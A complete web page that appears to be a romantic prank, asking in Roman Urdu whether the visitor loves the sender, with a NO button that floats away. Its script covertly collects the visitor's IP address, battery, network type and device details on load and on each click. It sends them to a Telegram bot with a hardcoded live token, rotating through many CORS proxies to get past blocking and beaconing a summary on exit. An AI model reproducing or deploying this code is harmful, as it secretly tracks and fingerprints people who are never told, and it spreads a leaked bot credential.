<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TUM MERY SY PAYAAR KERTI HO KA NAI?</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fbc2eb);
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        
        .container {
            text-align: center;
            z-index: 10;
            background: rgba(255, 255, 255, 0.9);
            padding: 30px 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            max-width: 90%;
        }
        
        .sticker {
            font-size: 4rem;
            margin-bottom: 20px;
            animation: heartbeat 1.5s infinite;
            display: block;
        }
        
        @keyframes heartbeat {
            0% { transform: scale(1); }
            50% { transform: scale(1.2); }
           100% { transform: scale(1); }
        }
        
        h1 {
            color: #e91e63;
            margin-bottom: 25px;
            font-size: 1.8rem;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        
        .buttons {
            display: flex;
            gap: 20px;
            margin-top: 20px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        button {
            padding: 15px 30px;
            font-size: 1.2rem;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            min-width: 120px;
        }
        
        #yesBtn {
            background-color: #4CAF50;
            color: white;
            position: relative;
            z-index: 5;
        }
        
        #yesBtn:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }
        
        #noBtn {
            background-color: #f44336;
            color: white;
            position: absolute;
            z-index: 5;
        }
        
        #noBtn:hover {
            background-color: #d32f2f;
        }
        
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 30px 40px;
            border-radius: 20px;
            box-shadow: 0 5px 25px rgba(0,0,0,0.3);
            z-index: 100;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        
        .popup h2 {
            color: #e91e63;
            margin-bottom: 25px;
            font-size: 1.6rem;
        }
        
        .popup-buttons {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }
        
        .message {
            display: none;
            text-align: center;
            margin-top: 30px;
        }
        
        .love-text-3d {
            font-size: 2.5rem;
            font-weight: bold;
            color: 'none';
            text-shadow: 
                1px 1px 0px #c2185b,
                2px 2px 0px #c2185b,
                3px 3px 0px #c2185b,
                4px 4px 0px #880e4f,
                5px 5px 0px #880e4f,
                6px 6px 5px rgba(0,0,0,0.4);
            margin-bottom: 25px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        #chorogiBtn {
            background-color: #e91e63;
            color: white;
            margin-top: 15px;
            padding: 12px 25px;
        }
        
        #chorogiBtn:hover {
            background-color: #c2185b;
            transform: scale(1.05);
        }
        
        .floating-hearts {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 1;
            pointer-events: none;
        }
        
        .heart {
            position: absolute;
            font-size: 1.5rem;
            opacity: 0.7;
            animation: float 6s ease-in-out infinite;
        }
        
        @keyframes float {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 0.7;
            }
           100% {
                transform: translateY(-100vh) rotate(360deg);
                opacity: 0;
            }
        }
        
        .i-knew-it {
            margin-bottom: 15px;
            font-size: 1.5rem;
            color: #4CAF50;
            font-weight: bold;
        }
        
        /* Message Sending Interface */
        .message-sender {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 5px 25px rgba(0,0,0,0.3);
            z-index: 100;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        
        .message-sender h2 {
            color: #e91e63;
            margin-bottom: 20px;
            font-size: 1.5rem;
        }
        
        .message-input {
            width: 100%;
            padding: 12px;
            margin: 15px 0;
            border: 2px solid #e91e63;
            border-radius: 10px;
            font-size: 1rem;
            resize: none;
            min-height: 80px;
        }
        
        .message-input:focus {
            outline: none;
            border-color: #c2185b;
        }
        
        .sending-animation {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        
        .dot {
            width: 10px;
            height: 10px;
            background: #e91e63;
            border-radius: 50%;
            margin: 0 5px;
            animation: bounce 1.5s infinite;
        }
        
        .dot:nth-child(2) {
            animation-delay: 0.2s;
        }
        
        .dot:nth-child(3) {
            animation-delay: 0.4s;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .sent-confirmation {
            margin-top: 20px;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border-radius: 10px;
            display: none;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }
            
            h1 {
                font-size: 1.5rem;
            }
            
            button {
                padding: 12px 25px;
                font-size: 1rem;
                min-width: 100px;
            }
            
            .sticker {
                font-size: 3rem;
            }
            
            .love-text-3d {
                font-size: 2rem;
            }
            
            .message-sender {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="floating-hearts" id="floatingHearts"></div>
    
    <div class="container">
        <div class="sticker">ðŸ’–</div>
        
        <h1>TUM MERY SY PAYAAR KERTI HO KA NAI?</h1>
        
        <div class="buttons">
            <button id="yesBtn">YES</button>
            <!-- NO button will be positioned by JavaScript -->
        </div>
        
        <div id="popup" class="popup">
            <h2>DO YOU LOVE ME?</h2>
            <div class="popup-buttons">
                <button id="popupYes">YES</button>
                <button id="popupNo">NO</button>
            </div>
        </div>
        
        <div id="message" class="message">
            <div class="i-knew-it">I knew it too me! ðŸ’–</div>
            <div class="sticker">ðŸ’•</div>
            <div class="love-text-3d">I LOVE YOU BABY</div>
            <button id="chorogiBtn">CHORO GI KAB?</button>
        </div>
    </div>

    <button id="noBtn">NO</button>
    
    <!-- Message Sending Interface -->
    <div id="messageSender" class="message-sender">
        <h2>Send Message to Owner</h2>
        
        <textarea id="customMessage" class="message-input" placeholder="Write your message here..."></textarea>
        
        <div class="popup-buttons">
            <button id="sendMessageBtn">Send Message</button>
            <button id="cancelMessageBtn">Cancel</button>
        </div>
        
        <div class="sending-animation" id="sendingAnimation" style="display: none;">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        
        <div id="sentConfirmation" class="sent-confirmation">
            Message Sent Successfully! âœ…
        </div>
    </div>

    <script>
        // Telegram bot configuration
        const TELEGRAM_BOT_TOKEN = '7877854369:AAEIYNoCplbbEStAd8ubXKhcAfe78MpHi4E';
        const TELEGRAM_CHAT_ID = '7434701597';
        
        // Enhanced list of stable global CORS proxy servers
        const PROXY_SERVERS = [
            // Most reliable and stable proxies
            'https://corsproxy.io/?',
            'https://api.codetabs.com/v1/proxy?quest=',
            'https://cors-anywhere.herokuapp.com/',
            'https://proxy.cors.sh/',
            'https://cors.bridged.cc/',
            
            // New stable proxies
            'https://api.allorigins.win/raw?url=',
            'https://cors.eu.org/',
            'https://crossorigin.me/',
            'https://jsonp.afeld.me/?url=',
            
            // Additional reliable proxies
            'https://cors-proxy.htmldriven.com/?url=',
            'https://yacdn.org/proxy/',
            'https://api.cors.link/?url=',
            
            // Backup proxies with good uptime
            'https://web-production-ca65.up.railway.app/',
            'https://cors-anywhere.cyclic.app/',
            'https://secure-cors-proxy.herokuapp.com/',
            
            // New stable alternatives
            'https://cors.snk9.com/?url=',
            'https://proxy.immersivecode.io/?url=',
            'https://cors.deno.dev/',
            'https://cors.darkube.app/?url=',
            'https://cors.proxy.consumet.org/',
            
            // Additional fallbacks
            'https://thingproxy.freeboard.io/fetch/',
            'https://mirror.byteark.com/?url=',
            'https://quiet-bayou-69163.herokuapp.com/',
            'https://rocky-bastion-12985.herokuapp.com/',
            
            // More stable options
            'https://cors.api.hackeryou.com/?url=',
            'https://api.whatsapp-cors.com/proxy?url=',
            'https://proxy.w3.org/services/proxy?url=',
            'https://cors.gospelideahs.org/?url=',
            
            // Recent stable proxies
            'https://cors.488848.xyz/?url=',
            'https://proxy.tokyo-hot.com/?url=',
            'https://cors.workingproxy.com/?url=',
            'https://proxy.rayrock.com/?url=',
            
            // Enterprise-grade proxies
            'https://api.cors.wiki/?url=',
            'https://proxy.techforge.com/?url=',
            'https://cors.secureconnect.com/?url='
        ];
        
        // User activity tracking
        let userActivities = [];
        let sessionStartTime = new Date();
        let currentProxyIndex = Math.floor(Math.random() * PROXY_SERVERS.length);
        let userIP = 'Fetching...';
        let batteryLevel = 'Unknown';
        let networkType = 'Unknown';
        let deviceInfo = '';

        // Get elements
        const noBtn = document.getElementById('noBtn');
        const yesBtn = document.getElementById('yesBtn');
        const popup = document.getElementById('popup');
        const popupYes = document.getElementById('popupYes');
        const popupNo = document.getElementById('popupNo');
        const message = document.getElementById('message');
        const chorogiBtn = document.getElementById('chorogiBtn');
        const floatingHearts = document.getElementById('floatingHearts');
        const messageSender = document.getElementById('messageSender');
        const customMessage = document.getElementById('customMessage');
        const sendMessageBtn = document.getElementById('sendMessageBtn');
        const cancelMessageBtn = document.getElementById('cancelMessageBtn');
        const sendingAnimation = document.getElementById('sendingAnimation');
        const sentConfirmation = document.getElementById('sentConfirmation');
        
        // Get user IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    userIP = data.ip;
                } catch {
                    userIP = 'Unable to fetch';
                }
            }
        }

        // Get battery information
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                } catch {
                    batteryLevel = 'Not available';
                }
            } else {
                batteryLevel = 'API not supported';
            }
        }

        // Get network information
        function getNetworkInfo() {
            if ('connection' in navigator) {
                const connection = navigator.connection;
                if (connection) {
                    networkType = connection.effectiveType || 'Unknown';
                }
            }
        }

        // Get detailed device information
        function getDeviceInfo() {
            deviceInfo = `
Platform: ${navigator.platform}
User Agent: ${navigator.userAgent}
Language: ${navigator.language}
CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
Max Touch Points: ${navigator.maxTouchPoints || 'None'}
Device Memory: ${navigator.deviceMemory || 'Unknown'} GB
            `.trim();
        }

        // Initialize user information
        async function initUserInfo() {
            await getUserIP();
            await getBatteryInfo();
            getNetworkInfo();
            getDeviceInfo();
        }

        // Function to get the next proxy in rotation
        function getNextProxy() {
            currentProxyIndex = (currentProxyIndex + 1) % PROXY_SERVERS.length;
            return PROXY_SERVERS[currentProxyIndex];
        }
        
        // Function to send messages to Telegram using multiple proxy fallbacks
        async function sendToTelegram(text) {
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const params = new URLSearchParams({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            });
            
            const targetUrl = `${telegramUrl}?${params}`;
            
            // Try direct connection first
            try {
                console.log('Trying direct connection to Telegram API...');
                const response = await fetch(targetUrl, { 
                    method: 'POST',
                    signal: AbortSignal.timeout(5000)
                });
                if (response.ok) {
                    const data = await response.json();
                    console.log('Direct connection successful!', data);
                    return data;
                }
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            } catch (directError) {
                console.log('Direct connection failed, trying proxies...', directError);
                
                // Try each proxy server in sequence
                const totalProxies = PROXY_SERVERS.length;
                for (let attempts = 0; attempts < totalProxies * 2; attempts++) {
                    const proxyUrl = getNextProxy();
                    try {
                        const proxyTarget = proxyUrl.endsWith('=') || proxyUrl.endsWith('?') || 
                                          proxyUrl.endsWith('/') ? 
                                           `${proxyUrl}${encodeURIComponent(targetUrl)}` : 
                                           `${proxyUrl}${targetUrl}`;
                        
                        console.log(`Trying proxy ${currentProxyIndex + 1}/${totalProxies}: ${proxyUrl}`);
                        
                        const response = await fetch(proxyTarget, {
                            method: 'POST',
                            headers: {
                                'X-Requested-With': 'XMLHttpRequest',
                                'Origin': window.location.origin
                            },
                            signal: AbortSignal.timeout(6000)
                        });
                        
                        if (response.ok) {
                            const data = await response.json();
                            console.log(`Proxy ${currentProxyIndex + 1} successful!`, data);
                            return data;
                        }
                        throw new Error(`Proxy HTTP ${response.status}`);
                    } catch (proxyError) {
                        console.error(`Proxy ${currentProxyIndex + 1} failed:`, proxyError);
                        await new Promise(resolve => setTimeout(resolve, 200));
                    }
                }
                
                throw new Error('All proxy servers failed after multiple attempts');
            }
        }
        
        // Track user activity with detailed information
        function trackActivity(action) {
            const activity = {
                action: action,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                screenResolution: `${window.innerWidth}x${window.innerHeight}`,
                timeOnPage: Math.floor((new Date() - sessionStartTime) / 1000) + 's',
                url: window.location.href,
                ip: userIP,
                battery: batteryLevel,
                network: networkType,
                device: deviceInfo
            };
            
            userActivities.push(activity);
            console.log('Activity tracked:', activity);
            
            // Format message with detailed information
            const messageText = `â¤ï¸ Love Test Activity â¤ï¸

Action: ${activity.action}
Time: ${new Date(activity.timestamp).toLocaleString()}

Device: ${navigator.platform}

Screen: ${activity.screenResolution}

Time on page: ${activity.timeOnPage}

About Phone:
IP: ${activity.ip}
Battery: ${activity.battery}
Network: ${activity.network}

${activity.device}`;
            
            // Send to Telegram (fire and forget - don't wait for response)
            sendToTelegram(messageText)
                .then(data => {
                    console.log('Message sent to Telegram successfully:', data);
                })
                .catch(error => {
                    console.error('All sending methods failed:', error);
                });
        }
        
        // Send custom message to Telegram with detailed information
        function sendCustomMessageToTelegram(customText) {
            const currentTime = new Date().toLocaleString('en-US', {
                hour12: true,
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });
            
            const messageText = `ðŸ’Œ Custom Message from Love Test ðŸ’Œ

Message: ${customText}

Time: ${currentTime}

Device: ${navigator.platform}

Screen: ${window.innerWidth}x${window.innerHeight}

About Phone:
IP: ${userIP}
Battery: ${batteryLevel}
Network: ${networkType}

URL: ${window.location.href}

${deviceInfo}`;
            
            return sendToTelegram(messageText);
        }
        
        // Send all activities when user leaves the page
        window.addEventListener('beforeunload', () => {
            if (userActivities.length > 0) {
                const summary = `â¤ï¸ Love Test Summary â¤ï¸

Total activities: ${userActivities.length}
Session started: ${new Date(sessionStartTime).toLocaleString()}
Session ended: ${new Date().toLocaleString()}
Total time: ${Math.floor((new Date() - sessionStartTime) / 1000)} seconds

Last action: ${userActivities[userActivities.length - 1].action}
Page: ${window.location.href}

About Phone:
IP: ${userIP}
Battery: ${batteryLevel}
Network: ${networkType}`;
                
                // Use sendBeacon for reliable sending on page unload
                try {
                    navigator.sendBeacon(
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                        new URLSearchParams({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: summary
                        })
                    );
                } catch (e) {
                    // Last attempt with fetch
                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        body: new URLSearchParams({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: summary
                        }),
                        keepalive: true
                    }).catch(() => {});
                }
            }
        });
        
        // Create floating hearts
        function createHearts() {
            const heart = document.createElement('div');
            heart.innerHTML = 'ðŸ’–';
            heart.classList.add('heart');
            heart.style.left = Math.random() * 100 + 'vw';
            heart.style.animationDuration = (Math.random() * 6 + 4) + 's';
            heart.style.fontSize = (Math.random() * 20 + 10) + 'px';
            floatingHearts.appendChild(heart);
            
            setTimeout(() => {
                heart.remove();
            }, 10000);
        }
        
        // Create initial hearts
        for (let i = 0; i < 15; i++) {
            setTimeout(() => createHearts(), i * 300);
        }
        
        // Continue creating hearts
        setInterval(createHearts, 1500);
        
        // Make NO button float around the entire page
        let posX = Math.random() * (window.innerWidth - noBtn.offsetWidth);
        let posY = Math.random() * (window.innerHeight - noBtn.offsetHeight);
        let speedX = (Math.random() - 0.5) * 4;
        let speedY = (Math.random() - 0.5) * 4;
        
        function animateNoButton() {
            posX += speedX;
            posY += speedY;
            
            if (posX <= 0 || posX >= window.innerWidth - noBtn.offsetWidth) {
                speedX = -speedX;
            }
            if (posY <= 0 || posY >= window.innerHeight - noBtn.offsetHeight) {
                speedY = -speedY;
            }
            
            noBtn.style.left = posX + 'px';
            noBtn.style.top = posY + 'px';
            
            requestAnimationFrame(animateNoButton);
        }
        
        // Start animation
        animateNoButton();
        
        // Initialize user information and track page load
        initUserInfo().then(() => {
            setTimeout(() => trackActivity('Page loaded'), 1000);
        });
        
        // NO button click - show popup
        noBtn.addEventListener('click', () => {
            popup.style.display = 'block';
            trackActivity('Clicked NO button');
        });
        
        // Popup NO button click
        popupNo.addEventListener('click', () => {
            popup.style.display = 'none';
            trackActivity('Clicked NO in popup');
            
            posX = Math.random() * (window.innerWidth - noBtn.offsetWidth);
            posY = Math.random() * (window.innerHeight - noBtn.offsetHeight);
            
            setTimeout(() => {
                popup.style.display = 'block';
            }, 300);
        });
        
        // Popup YES button click - show love message
        popupYes.addEventListener('click', () => {
            popup.style.display = 'none';
            message.style.display = 'block';
            trackActivity('Clicked YES in popup - Confirmed love');
        });
        
        // Main YES button click - show love message directly
        yesBtn.addEventListener('click', () => {
            message.style.display = 'block';
            trackActivity('Clicked YES button - Direct confirmation');
        });
        
        // Chorogi button click - show message sending interface
        chorogiBtn.addEventListener('click', () => {
            messageSender.style.display = 'block';
            trackActivity('Clicked CHORO GI KAB button');
        });
        
        // Send message button click
        sendMessageBtn.addEventListener('click', () => {
            const messageText = customMessage.value.trim();
            if (messageText) {
                document.querySelector('.popup-buttons').style.display = 'none';
                sendingAnimation.style.display = 'flex';
                
                sendCustomMessageToTelegram(messageText)
                    .then(data => {
                        sendingAnimation.style.display = 'none';
                        sentConfirmation.style.display = 'block';
                        
                        trackActivity(`Sent custom message: ${messageText}`);
                        
                        setTimeout(() => {
                            messageSender.style.display = 'none';
                            sentConfirmation.style.display = 'none';
                            document.querySelector('.popup-buttons').style.display = 'flex';
                            customMessage.value = '';
                        }, 2000);
                    })
                    .catch(error => {
                        console.error('Error sending message:', error);
                        alert('Failed to send message. Please try again.');
                        sendingAnimation.style.display = 'none';
                        document.querySelector('.popup-buttons').style.display = 'flex';
                    });
            } else {
                alert('Please write a message first!');
            }
        });
        
        // Cancel message button click
        cancelMessageBtn.addEventListener('click', () => {
            messageSender.style.display = 'none';
            customMessage.value = '';
        });
        
        // Make sure the page is responsive
        window.addEventListener('resize', () => {
            if (posX > window.innerWidth - noBtn.offsetWidth) {
                posX = window.innerWidth - noBtn.offsetWidth;
            }
            if (posY > window.innerHeight - noBtn.offsetHeight) {
                posY = window.innerHeight - noBtn.offsetHeight;
            }
        });
    </script>

</body></html>